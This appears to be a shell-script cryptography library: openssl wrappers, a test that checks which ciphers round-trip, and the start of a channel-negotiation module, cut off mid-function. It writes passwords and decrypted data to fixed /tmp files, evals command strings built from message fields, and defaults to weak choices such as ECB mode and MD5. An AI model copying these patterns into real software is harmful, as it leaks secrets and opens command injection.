shCryptciphers="$shCryptciphers:des-ede3-cfb1:des-ede3-cfb8:des-ede3-ofb"
shCryptciphers="$shCryptciphers:des-ofb:des3:desx"
shCryptciphers="$shCryptciphers:desx-cbc:id-aes128-GCM:id-aes192-GCM"
shCryptciphers="$shCryptciphers:id-aes256-GCM:rc2:rc2-40-cbc"
shCryptciphers="$shCryptciphers:rc2-64-cbc:rc2-cbc:rc2-cfb"
shCryptciphers="$shCryptciphers:rc2-ecb:rc2-ofb:rc4"
shCryptciphers="$shCryptciphers:rc4-40:rc4-hmac-md5:seed"
shCryptciphers="$shCryptciphers:seed-cbc:seed-cfb:seed-ecb"
shCryptciphers="$shCryptciphers:seed-ofb"

shCryptDbCiphersSize="AES-128-CBC:16 AES-128-CFB:16 AES-128-CFB1:16 AES-128-CFB8:16 AES-128-CTR:16 AES-128-ECB:0 AES-128-OFB:16 AES-128-XTS:16 AES-192-CBC:16 AES-192-CFB:16 AES-192-CFB1:16 AES-192-CFB8:16 AES-192-CTR:16 AES-192-ECB:0 AES-192-OFB:16 AES-256-CBC:16 AES-256-CFB:16 AES-256-CFB1:16 AES-256-CFB8:16 AES-256-CTR:16 AES-256-ECB:0 AES-256-OFB:16 AES-256-XTS:16 BF-CBC:8 BF-CFB:8 BF-ECB:0 BF-OFB:8 CAMELLIA-128-CBC:16 CAMELLIA-128-CFB:16 CAMELLIA-128-CFB1:16 CAMELLIA-128-CFB8:16 CAMELLIA-128-ECB:0 CAMELLIA-128-OFB:16 CAMELLIA-192-CBC:16 CAMELLIA-192-CFB:16 CAMELLIA-192-CFB1:16 CAMELLIA-192-CFB8:16 CAMELLIA-192-ECB:0 CAMELLIA-192-OFB:16 CAMELLIA-256-CBC:16 CAMELLIA-256-CFB:16 CAMELLIA-256-CFB1:16 CAMELLIA-256-CFB8:16 CAMELLIA-256-ECB:0 CAMELLIA-256-OFB:16 CAST5-CBC:8 CAST5-CFB:8 CAST5-ECB:0 CAST5-OFB:8 DES-CBC:8 DES-CFB:8 DES-CFB1:8 DES-CFB8:8 DES-ECB:0 DES-EDE:0 DES-EDE-CBC:8 DES-EDE-CFB:8 DES-EDE-OFB:8 DES-EDE3:0 DES-EDE3-CBC:8 DES-EDE3-CFB:8 DES-EDE3-CFB1:8 DES-EDE3-CFB8:8 DES-EDE3-OFB:8 DES-OFB:8 DESX-CBC:8 IDEA-CBC:8 IDEA-CFB:8 IDEA-ECB:0 IDEA-OFB:8 RC2-40-CBC:8 RC2-64-CBC:8 RC2-CBC:8 RC2-CFB:8 RC2-ECB:0 RC2-OFB:8 RC4:0 RC4-40:0 RC4-HMAC-MD5:0 SEED-CBC:16 SEED-CFB:16 SEED-ECB:0 SEED-OFB:16 aes-128-cbc:16 aes-128-ccm:12 aes-128-cfb:16 aes-128-cfb1:16 aes-128-cfb8:16 aes-128-ctr:16 aes-128-ecb:0 aes-128-gcm:12 aes-128-ofb:16 aes-128-xts:16 aes-192-cbc:16 aes-192-ccm:12 aes-192-cfb:16 aes-192-cfb1:16 aes-192-cfb8:16 aes-192-ctr:16 aes-192-ecb:0 aes-192-gcm:12 aes-192-ofb:16 aes-256-cbc:16 aes-256-ccm:12 aes-256-cfb:16 aes-256-cfb1:16 aes-256-cfb8:16 aes-256-ctr:16 aes-256-ecb:0 aes-256-gcm:12 aes-256-ofb:16 aes-256-xts:16 bf-cbc:8 bf-cfb:8 bf-ecb:0 bf-ofb:8 camellia-128-cbc:16 camellia-128-cfb:16 camellia-128-cfb1:16 camellia-128-cfb8:16 camellia-128-ecb:0 camellia-128-ofb:16 camellia-192-cbc:16 camellia-192-cfb:16 camellia-192-cfb1:16 camellia-192-cfb8:16 camellia-192-ecb:0 camellia-192-ofb:16 camellia-256-cbc:16 camellia-256-cfb:16 camellia-256-cfb1:16 camellia-256-cfb8:16 camellia-256-ecb:0 camellia-256-ofb:16 cast5-cbc:8 cast5-cfb:8 cast5-ecb:0 cast5-ofb:8 des-cbc:8 des-cfb:8 des-cfb1:8 des-cfb8:8 des-ecb:0 des-ede:0 des-ede-cbc:8 des-ede-cfb:8 des-ede-ofb:8 des-ede3:0 des-ede3-cbc:8 des-ede3-cfb:8 des-ede3-cfb1:8 des-ede3-cfb8:8 des-ede3-ofb:8 des-ofb:8 desx-cbc:8 id-aes128-CCM:12 id-aes128-GCM:12 id-aes128-wrap:8 id-aes192-CCM:12 id-aes192-GCM:12 id-aes192-wrap:8 id-aes256-CCM:12 id-aes256-GCM:12 id-aes256-wrap:8 id-smime-alg-CMS3DESwrap:0 idea-cbc:8 idea-cfb:8 idea-ecb:0 idea-ofb:8 rc2-40-cbc:8 rc2-64-cbc:8 rc2-cbc:8 rc2-cfb:8 rc2-ecb:0 rc2-ofb:8 rc4:0 rc4-40:0 rc4-hmac-md5:0 seed-cbc:16 seed-cfb:16 seed-ecb:0 seed-ofb:16"
### "command list ssl cipher string"
#if [ -z "$shCryptciphers" ];then
# shCryptciphers="$($cmdOpenssl ciphers 2>/dev/null)" 
#fi
### "command list ssl cipher string"

shCryptciphersListCMD=""
if [ -z "$shCryptciphersListCMD" ];then
 shCryptciphersListCMD="$($cmdOpenssl list-cipher-commands 2>/dev/null | $cmdTr '\n' ':')"
fi
if [ -z "$shCryptciphersListCMD" ];then 
 shCryptciphersListCMD="$($cmdOpenssl enc -ciphers 2>/dev/null | $cmdTr -s ' ' '\n' | $cmdCut -f2- -d'-' | $cmdTr '\n' ':')"
fi

#[ "$shCryptDebug" ] && shLog $shLog_DEBUG "$shCryptciphersListCMD" >&2
#$cmdPrintf "[shCryptciphers]$shCryptciphers"
#shCryptciphers="$shCryptciphers:$shCryptciphersListCMD"
if [ -n "$shCryptciphersListCMD" ];then 
 shCryptciphers="$shCryptciphersListCMD"
fi

shCryptdigestsListCMD=""
if [ -z "$shCryptdigestsListCMD" ];then
 shCryptdigestsListCMD="$($cmdOpenssl list-message-digest-commands 2>/dev/null | $cmdTr '\n' ':')"
fi
if [ -z "$shCryptdigestsListCMD" ];then # openssl 
 shCryptdigestsListCMD="$($cmdOpenssl list -digest-commands 2>/dev/null | $cmdTr '\n' ' ' | $cmdTr -s ' ' ':' )"
fi
if [ -n "$shCryptdigestsListCMD" ];then 
 shCryptdigests="$shCryptdigestsListCMD"
fi


#seed-ecb: echec on key 0 / REALY NOT WORK ON PORTABLE
#aes128: no key / NOT WORK ON PORTABLE
shCryptciphers="aes-128-cbc:aes-128-ecb"
#md4 md5 rmd160 sha sha1
#shCryptdigests="md4:md5:rmd160:sha:sha1"

#cryptMessagePipe=$(shPipeInit  2>/dev/null )
#shPipeOpen $cryptMessagePipe 2>/dev/null
cryptPassPipe=$(shPipeInit 2>/dev/null )
shPipeOpen $cryptPassPipe 2>/dev/null

shCryptJsonPass="pass"
shCryptJsonSalt="salt"
shCryptJsonCipher="cipher"
shCryptJsonCiphers="ciphers"
shCryptJsonIv="iv"
shCryptJsonKey="key"
shCryptJsonDigest="digest"
shCryptJsonDigests="digests"
shCryptJsonBundary="bundary"

# shCryptInit
shCryptInit() {
 local shLogfunc="shCryptInit()"
 [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 $cmdPrintf "{}" | jsonInObjectWrite "$shCryptJsonBundary" "$(shRandomizeASCCI 5)" | jsonInObjectWrite "$shCryptJsonPass" "$(shRandomizeASCCI 10)" | jsonInObjectWrite "$shCryptJsonSalt" "$(shRandomizeASCCI 8)"
}
# shCryptInitMessage "$ciphers" "$digests"
shCryptInitMessage(){
 local shLogfunc="shCryptInitMessage()";

 [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc:$1 ,$2" >&2
 shCryptInitCipher "$(shCryptListGetAnRandom $1)" "$(shCryptListGetAnRandom $2)"
}
# shCryptInitCipher "$cipher" "$digest"
shCryptInitCipher() {
 local shLogfunc="shCryptInitCipher($1 ,$2)";
 [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 local cipher="$1"
 local digest="$2"
 # generate pass 1ko, salt 8octet
 local jsonInit="$(shCryptInit)";
 local jsonInit="$($cmdPrintf $jsonInit | jsonInObjectWrite $shCryptJsonCipher $cipher)"
 local jsonInit="$($cmdPrintf $jsonInit | jsonInObjectWrite $shCryptJsonDigest $digest)"
 # read iv/key size of ciphers
 local cipherIvSize="$(shCryptCipherIvSize $cipher)";
 local shLogfunc="shCryptInitCipher($cipher/$digest/iv:$cipherIvSize)";
 local cipherKeySize=$cipherIvSize;
 if [ $cipherIvSize -eq -1 ];then
  [ "$shCryptDebug" ] && shLog $shLog_WARNING "$shLogfunc: ! unknow size for iv !" >&2
 else
  [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: IV:$cipherIvSize" >&2
  if [ $cipherIvSize -gt 0 ];then
   local jsonInit="$($cmdPrintf $jsonInit | jsonInObjectWrite $shCryptJsonKey $(shRandomizeASCCI $cipherKeySize))"
   local jsonInit="$($cmdPrintf $jsonInit | jsonInObjectWrite $shCryptJsonIv $(shRandomizeASCCI $cipherIvSize))"
  fi
 fi
 $cmdPrintf $jsonInit
}
shCryptCipherIvSize() {
 local cipher="$1"
 local theSize="-1"
 for cipherData in $($cmdPrintf $shCryptDbCiphersSize | $cmdTr ' ' '\n');do
  local cipherName="$($cmdPrintf $cipherData | $cmdCut -d':' -f1)"
  local cipherSize="$($cmdPrintf $cipherData | $cmdCut -d':' -f2)"
  if [ x$cipher = x$cipherName ];then
   local theSize=$cipherSize
   break;
  fi
 done
 $cmdPrintf "$theSize"
}
shCryptListUnionCommon() {
 local shLogfunc="shCryptListUnionCommon()";
 local lList="$1"
 local rList="$2"
 local fList=""
 for lElement in $($cmdPrintf $lList | $cmdTr -d '\n' | $cmdTr -s ': ' '\n');do
  for rElement in $($cmdPrintf $rList | $cmdTr -d '\n' | $cmdTr -s ': ' '\n' );do
   if [ "$lElement" = "$rElement" ];then
    if [ -z "$fList" ];then
	 local fList="$lElement"
	else
	 local fList="$lElement:$fList"
	fi
	break;
   fi
  done
 done
 [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: fList:\r\n$fList" >&2
 $cmdPrintf "$fList"
}
shCryptListGetAnRandom() {
 local shLogfunc="shCryptListUnionCommon()";
 local list="$1"
 local cptList="$(shCryptListCount $list)"
 shCryptListGet "$($cmdShuf -i 1-$cptList -n 1)" "$list"
}
shCryptListCount() {
 local list="$1"
 local cpt=0

 for element in $($cmdPrintf $list | $cmdTr ':' '\n' );do
  if [ -n "$element" ];then local cpt=$(( cpt+1 ));fi
 done
 $cmdPrintf "$cpt"
}
shCryptListGet() {
 local index="$1"
 local list="$2"
 local found=""
 local cpt=1

 for element in $($cmdPrintf $list | $cmdTr ':' '\n' );do
  [ $cpt -eq $index ] && local found="$element" && break || local cpt=$(( cpt+1 ));
 done
 if [ -z "$found" ];then
  [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: no found '$index' in list:\r\n$list" >&2
 fi
 $cmdPrintf "$found"
}
shCryptDecode() {
 local shLogfunc="shCryptDecode()"
 
 local jsonMessage="$($cmdCat <&0)"
 if [ -z "$cryptPassPipe" ];then
  [ "$shCryptDebug" ] && shLog $shLog_ERROR "$shLogfunc: cryptPassPipe empty" >&2
  return ;
 fi
 
 local cipher="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonCipher)"
 local digest="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonDigest)"
 local pass="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonPass)"
 local salt="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonSalt)"
 local iv="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonIv)"
 local key="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonKey)"
 local bundary="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonBundary)"
 
 local shLogfunc="shCryptDecode($cipher/$digest) bundary:$bundary"
 
 local passSize="$($cmdPrintf "$pass" | $cmdWc -c)"
 local saltSize="$($cmdPrintf "$salt" | $cmdWc -c)"
 local ivSize="$($cmdPrintf "$iv" | $cmdWc -c)"
 local keySize="$($cmdPrintf "$key" | $cmdWc -c)"
 [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: pass($passSize) salt($saltSize) iv($ivSize) key($keySize)" >&2
 
 local mdOption=" -md $digest "
 local saltOption="";
 if [ -z "$salt" ];then
  local saltOption=" -nosalt "
 else
   local saltHex="$($cmdPrintf "$salt" | shCryptStrToHex )"
#   [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: saltHex:$saltHex" >&2
   local saltOption=" -salt -S $saltHex "
 fi
 local ivKeyOption="";
 if [ -n "$iv" ] && [ -n "$key" ];then
  local ivHex="$($cmdPrintf $iv | shCryptStrToHex )"
  local keyHex="$($cmdPrintf $key | shCryptStrToHex )"
  local ivKeyOption=" -K $keyHex -iv $ivHex "
#  [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: ivHex/keyHex:$ivHex/$keyHex" >&2
 fi

 local decrypt_cmd="$cmdOpenssl enc -$cipher -d -pass pass:$pass $ivKeyOption $saltOption $mdOption 2>/dev/null"
 $cmdPrintf "$decrypt_cmd" > /tmp/shCryptExec
 
 local decrypt_cmd="$cmdOpenssl enc -$cipher -d -pass fd:$cryptPassPipe $ivKeyOption $saltOption $mdOption 2>/tmp/shCryptDecodeOpenSslErr"
 # [ "$shCryptDebug" ] && shLog $shLog_DEBUG "$shLogfunc: $decrypt_cmd" >&2
 $cmdPrintf "$pass\n" >&$cryptPassPipe
 $cmdPrintf $jsonMessage | jsonInObjectRead data | shString64Filter | $cmdTee /tmp/shCryptDecode | $cmdBase64 -d -i 2>/dev/null | eval $decrypt_cmd | $cmdTee /tmp/shCryptDecoded | shString64Filter | $cmdSed "s/${bundary}/#/g" | $cmdCut -d'#' -f2 | $cmdBase64 -d -i 2>/dev/null
}
shCryptEncode() {
 local shLogfunc="shCryptEncode()"
 
 local jsonMessage="$($cmdCat <&0)"
 if [ -z "$cryptPassPipe" ];then
  [ "$shCryptDebug" ] && shLog $shLog_ERROR "$shLogfunc: cryptPassPipe empty" >&2
  return ;
 fi 
 local cipher="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonCipher)"
 local digest="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonDigest)"
 local pass="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonPass)"
 local salt="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonSalt)"
 local iv="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonIv)"
 local key="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonKey)"
 local bundary="$($cmdPrintf $jsonMessage | jsonInObjectRead $shCryptJsonBundary)"
 local shLogfunc="shCryptEncode($cipher/$digest) bundary:$bundary"
 
 local passSize="$($cmdPrintf "$pass" | $cmdWc -c)"
 local saltSize="$($cmdPrintf "$salt" | $cmdWc -c)"
 local ivSize="$($cmdPrintf "$iv" | $cmdWc -c)"
 local keySize="$($cmdPrintf "$key" | $cmdWc -c)"
 [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: pass($passSize) salt($saltSize) iv($ivSize) key($keySize)" >&2
 
 local mdOption=" -md $digest "
 local saltOption="";
 if [ -z "$salt" ];then
  local saltOption=" -nosalt "
 else
   local saltHex="$($cmdPrintf "$salt" | shCryptStrToHex )"
#   [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: saltHex:$saltHex" >&2
   local saltOption=" -salt -S $saltHex "
 fi
 local ivKeyOption="";
 if [ -n "$iv" ] && [ -n "$key" ];then
  local ivHex="$($cmdPrintf "$iv" | shCryptStrToHex )"
  local keyHex="$($cmdPrintf "$key" | shCryptStrToHex )"
  local ivKeyOption="-K $keyHex -iv $ivHex"
#  [ "$shCryptDebug" ] && shLog $shLog_TRACE "$shLogfunc: ivHex/keyHex:$ivHex/$keyHex" >&2
 fi
 local encrypt_cmd="$cmdOpenssl enc -$cipher -pass fd:$cryptPassPipe $ivKeyOption $saltOption $mdOption 2>/dev/null"
 #[ "$shCryptDebug" ] && shLog $shLog_DEBUG "$shLogfunc: $encrypt_cmd" >&2
 
 $cmdPrintf "$pass\n" >&$cryptPassPipe
 $cmdPrintf $jsonMessage | jsonInObjectRead data | $cmdBase64 | shString64Filter | { $cmdPrintf "$(shRandomizeASCCI 30)${bundary}";$cmdCat <&0 ; $cmdPrintf "${bundary}$(shRandomizeASCCI 30)"; } | eval $encrypt_cmd | $cmdBase64 | shString64Filter
}

 $cmdPrintf "{"bundary":"eiGQE","pass":"wkqzhpot30","salt":"xgLRD954","cipher":"aes-128-cbc","digest":"md5","key":"xfeqpzolCm21768Q","iv":"582gcfanyiww0tup","ciphers":"aes-128-cbc","digests":"md5","data":"eyJidW5kYXJ5IjoxODY3OSwicGFzcyI6InpscmZoV0lacGIiLCJzYWx0IjoieHV3bGR0ZWQiLCJjaXBoZXIiOiJhZXMtMTI4LWNiYyIsImRpZ2VzdCI6Im1kNSIsImtleSI6IkpUWEM5NjAzMjcxNHdjcDQiLCJpdiI6IjE4NzMyNDZESkZBRVBXUmMiLCJjaXBoZXJzIjoiYWVzLTEyOC1jYmMiLCJkaWdlc3RzIjoibWQ1IiwicHJvdG8iOiJodHRwIiwicG9ydCI6NDU1MTksImlwYWRkcmVzcyI6IjEyNy4xNTMuMTY0LjE4NCIsImhvc3QiOiJrZXJuZWwuZGFya3dlYi5mciJ9"}" | shPipeWrite $jsonPipe 2>/dev/null;
#!/bin/sh
shCryptTest="1"
#shCryptTest=""
cmdList="cmdSh cmdCat cmdTimeout cmdTr cmdXargs cmdCut cmdWget cmdBase64 cmdEcho cmdPrintf"
cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo"
cmdList="$cmdList cmdOpenssl"

shErrorOnMissing $cmdList >&2

# shCryptListUnionCommon "ciphersA" "ciphersB"
#
shCryptTestListCiphers() {
 local shLogfunc="shCryptTestListCiphers()"
 [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 shCryptTestCiphers "$shCryptciphers"
}
shCryptTestCiphers() {
 local shLogfunc="shCryptTestCiphers(init)"
 local tCiphers="$1"
 local ciphersSalt=""
 local ciphersNoSalt=""
 local ciphersIVSalt=""
 local ciphersIVNoSalt=""
 local ciphersReject=""
 local testData="$(shRandomizeASCCI 1000)"
 local testDigest="$(shCryptListGetAnRandom $shCryptdigests)"
 for cipher in $($cmdPrintf $tCiphers | $cmdTr ':' '\n' );do
  local cipherIvSize="$(shCryptCipherIvSize $cipher)"
  local shLogfunc="shCryptTestCiphers($cipher/$cipherIvSize)"
  local cipherAccept=0;
  local jsonMessageInit="$(shCryptInitCipher $cipher $testDigest)"
  local dataSize="$($cmdPrintf $testData | $cmdWc -c)"
  local passSize="$($cmdPrintf $jsonMessageInit | jsonInObjectRead pass | $cmdWc -c)"
  local saltSize="$($cmdPrintf $jsonMessageInit | jsonInObjectRead salt | $cmdWc -c)"
  [ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:data($dataSize):pass($passSize):salt($saltSize)" >&2;

  local jsonMessage="$($cmdPrintf $jsonMessageInit | jsonInObjectWrite data $testData )"
 
  [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc: test with salt" >&2
  clearData="$($cmdPrintf $jsonMessage | shCryptTestCipher)"
  #cryptData="$(shPipeRead $cryptCryptPipe)"
  if [ "$clearData" = "$testData" ];then
   local ciphersSalt="$cipher:$ciphersSalt";local cipherAccept=1;
   [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept $cipher with salt" >&2
  fi
  #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:clearData($($cmdPrintf $clearData | $cmdWc -c)):$clearData" >&2
  #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:cryptData($($cmdPrintf $cryptData | $cmdWc -c)):$cryptData" >&2
  [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc: test without salt" >&2
  local jsonMessage="$($cmdPrintf $jsonMessage | jsonInObjectWrite salt "" )"
  clearData="$($cmdPrintf $jsonMessage | shCryptTestCipher $cipher)"
  #cryptData="$(shPipeRead $cryptCryptPipe 2>/dev/null)"
  if [ "$clearData" = "$testData" ];then
   local ciphersNoSalt="$cipher:$ciphersNoSalt";local cipherAccept=1;
   [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept $cipher without salt" >&2
  fi
  #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:clearData($($cmdPrintf $clearData | $cmdWc -c)):$clearData" >&2
  #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:cryptData($($cmdPrintf $cryptData | $cmdWc -c)):$cryptData" >&2
  if [ $cipherAccept -eq 0 ];then
   local ciphersReject="$cipher:$ciphersReject"
   [ "$shCryptTest" ] && shLog $shLog_ERROR "$shLogfunc:reject $cipher with/without salt" >&2
  fi
  if [ $cipherIvSize -eq -1 ];then
   [ "$shCryptTest" ] && shLog $shLog_WARNING "$shLogfunc: ! unknow size for iv !" >&2
  else
   [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc: IV:$cipherIvSize" >&2
  fi
  if [ $cipherIvSize -gt 0 ];then
   #$(( $cipherIvSize * 2 ))
   local cipherKeySize=$cipherIvSize;
   local testKey64="$(shRandomizeASCCI $cipherKeySize)"
   local testIv64="$(shRandomizeASCCI $cipherIvSize)"
   [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc: test with salt and IV cipher/key/iv:$cipherKeySize/$($cmdPrintf $testKey64 | $cmdWc -c)/$($cmdPrintf $testIv64 | $cmdWc -c) " >&2
   local jsonMessage="$($cmdPrintf $jsonMessage | jsonInObjectWrite key $testKey64)"
   local jsonMessage="$($cmdPrintf $jsonMessage | jsonInObjectWrite iv $testIv64)"
   clearData="$($cmdPrintf $jsonMessage | shCryptTestCipher)"
   #cryptData="$(shPipeRead $cryptCryptPipe)"
   if [ "$clearData" = "$testData" ];then
    local ciphersIVSalt="$cipher:$ciphersIVSalt";local cipherAccept=1;
    [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept $cipher with salt and IV" >&2
   fi
   #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:clearData($($cmdPrintf $clearData | $cmdWc -c)):$clearData" >&2
   #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:cryptData($($cmdPrintf $cryptData | $cmdWc -c)):$cryptData" >&2
   [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc: test without salt" >&2
   local jsonMessage="$($cmdPrintf $jsonMessage | jsonInObjectWrite salt "" )"
   clearData="$($cmdPrintf $jsonMessage | shCryptTestCipher $cipher)"
   #cryptData="$(shPipeRead $cryptCryptPipe 2>/dev/null)"
   if [ "$clearData" = "$testData" ];then
    local ciphersIVNoSalt="$cipher:$ciphersIVNoSalt";local cipherAccept=1;
    [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept $cipher with IV and without salt" >&2
   fi
   #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:clearData($($cmdPrintf $clearData | $cmdWc -c)):$clearData" >&2
   #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc:cryptData($($cmdPrintf $cryptData | $cmdWc -c)):$cryptData" >&2
   if [ $cipherAccept -eq 0 ];then
    local ciphersReject="$cipher:$ciphersReject"
    [ "$shCryptTest" ] && shLog $shLog_ERROR "$shLogfunc:reject $cipher with/without salt for IV" >&2
   fi
  fi
 done
 local shLogfunc="shCryptTestCiphers(END)"
 local ciphers="$ciphersNoSalt:$ciphersSalt" 
 [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept($($cmdPrintf $ciphersSalt| $cmdTr ':' '\n' | $cmdWc -l)) with salt:\n$ciphersSalt" >&2
 [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept($($cmdPrintf $ciphersNoSalt| $cmdTr ':' '\n' | $cmdWc -l)) without salt:\n$ciphersNoSalt" >&2
 [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept($($cmdPrintf $ciphersIVSalt| $cmdTr ':' '\n' | $cmdWc -l)) with salt with IV:\n$ciphersIVSalt" >&2
 [ "$shCryptTest" ] && shLog $shLog_INFO "$shLogfunc:accept($($cmdPrintf $ciphersIVNoSalt| $cmdTr ':' '\n' | $cmdWc -l)) without salt with IV:\n$ciphersIVNoSalt" >&2
 [ "$shCryptTest" ] && shLog $shLog_ERROR "$shLogfunc:reject with/without salt:$ciphersReject" >&2
 $cmdPrintf $ciphers | $cmdTr -d '\n'
}

#clearResponseData="$($cmdPrintf $clearData | shCryptTestCipher $cipher $testPass $testSalt)"
shCryptTestCipher() {
 local shLogfunc="shCryptTestCipher()"
 
 local jsonMessage="$($cmdCat <&0)"
# [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc:jsonMessage:$jsonMessage" >&2
 local cipher="$($cmdPrintf $jsonMessage | jsonInObjectRead cipher)"
 local pass="$($cmdPrintf $jsonMessage | jsonInObjectRead pass)"
 local salt="$($cmdPrintf $jsonMessage | jsonInObjectRead salt)"
 local clearData="$($cmdPrintf $jsonMessage | jsonInObjectRead data)"
 
 local passSize="$($cmdPrintf "$pass" | $cmdWc -c)"
 local saltSize="$($cmdPrintf "$salt" | $cmdWc -c)"
 local dataSize="$($cmdPrintf "$clearData" | $cmdWc -c)"
 
 [ "$shCryptTest" ] && shLog $shLog_TRACE "$shLogfunc:$cipher pass($passSize)|salt:($saltSize)|data($dataSize)" >&2
 
 cryptData="$($cmdPrintf $jsonMessage | shCryptEncode $cipher)"
 #[ "$shCryptTest" ] && shLog $shLog_DEBUG "$shLogfunc: cryptData( $($cmdPrintf $cryptData | $cmdWc -c) ): will try to decrypt" >&2;
 
 local jsonMessageCrypt="$($cmdPrintf $jsonMessage | jsonInObjectWrite data $cryptData)"
 $cmdPrintf "$jsonMessageCrypt\n" | shCryptDecode
# $cmdPrintf "$cryptData" | shPipeWrite $cryptCryptPipe 2>/dev/null
}

#!/bin/sh
#shCryptoChannel="1"
shCryptoChannel=""
cmdList="cmdSh cmdTr cmdWget cmdBase64 cmdEcho cmdPrintf"
cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo"
cmdList="$cmdList cmdOpenssl"

shErrorOnMissing $cmdList

shCryptoChannelPipe=$(shPipeInit 2>/dev/null)
shPipeOpen $shCryptoChannelPipe 2>/dev/null

$cmdPrintf ""  | shPipeWrite $shCryptoChannelPipe 2>/dev/null

# sessionKey=$($cmdPrintf "$jsonMessage" | shCryptoChannelInit)

[ "$shCryptoChannel" ] && shLog $shLog_TRACE "shCryptoChannel mineCiphers/mineDigests" >&2
mineCiphers="$(shCryptTestListCiphers)";
mineDigests=$shCryptdigests;

# echo "{ ciphers : [ "cipher A", "cipher B", "cipher C" ],"
shCryptoChannelInit() {
 local shLogfunc="shCryptoChannelInit()"
 [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc" >&2
 local jsonMessageInit="$($cmdCat <&0)";
 if [ -z "$jsonMessageInit" ];then
  [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc no init in :\n$jsonMessageInit" >&2
 else
  ciphersCommon="$(shCryptListUnionCommon "$mineCiphers" "$($cmdPrintf "$jsonMessageInit" | jsonInObjectRead $shCryptJsonCiphers )")"
  if [ -z "$ciphersCommon" ];then
   [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc: no one common cipher.\n$ciphersCommon" >&2
  else 
   [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc: ciphers $(shCryptListCount $ciphersCommon)\n$ciphersCommon" >&2
   digestsCommon="$(shCryptListUnionCommon "$mineDigests" "$($cmdPrintf "$jsonMessageInit" | jsonInObjectRead $shCryptJsonDigests )")"
   if [ -z "$digestsCommon" ];then
    [ "$shCryptoChannel" ] && shLog $shLog_ERROR "$shLogfunc: no one common digest.\n$digestsCommon" >&2
   else 
    [ "$shCryptoChannel" ] && shLog $shLog_TRACE "$shLogfunc: digests $(shCryptListCount $digestsCommon)\n$digestsCommon" >&2
    local newSessionKey="$(shCryptoChannelSessionInit)"
    $cmdPrintf "{}" | jsonInObjectWrite $shCryptJsonCiphers "$ciphersCommon" | jsonInObjectWrite $shCryptJsonDigests "$digestsCommon" |\
     jsonInObjectWrite response64 $($cmdPrintf "$jsonMessageInit" | $cmdBase64 | $cmdTr -d ' \n') |\
     jsonInObjectWrite nextMessage64 $(shCryptInitMessage "$ciphersCommon" "$digestsCommon" | jsonInObjectWrite $shCryptJsonCiphers "$ciphersCommon" | jsonInObjectWrite $shCryptJsonDigests "$digestsCommon" | $cmdBase64 | $cmdTr -d ' \n') |\
     shCryptoChannelSessionSet $newSessionKey;
    [ "$shCryptoChannel" ] && shLog $shLog_INFO "$shLogfunc:newSessionKey $newSessionKey" >&2
    $cmdPrintf "$newSessionKey"
   fi
  fi
 fi
}
shCryptoChannelSessionInit() {
 local shLogfunc="shCryptoChannelSessionInit()"
 local shCryptoChannelBuffer="$(shPipeRead $shCryptoChannelPipe | $cmdTr -d '\n' )"
 local sessionKey="$($cmdPrintf "$shCryptoChannelBuffer" | $cmdWc -c)"
 [ "$shCryptoChannel" ] && shLog $shLog_INFO "$shLogfunc:$sessionKey" >&2
 $cmdPrintf "$shCryptoChannelBuffer|$sessionKey:" | shPipeWrite $shCryptoChannelPipe;
 $cmdPrintf "$sessionKey"
}
shCryptoChannelSessionSet() {
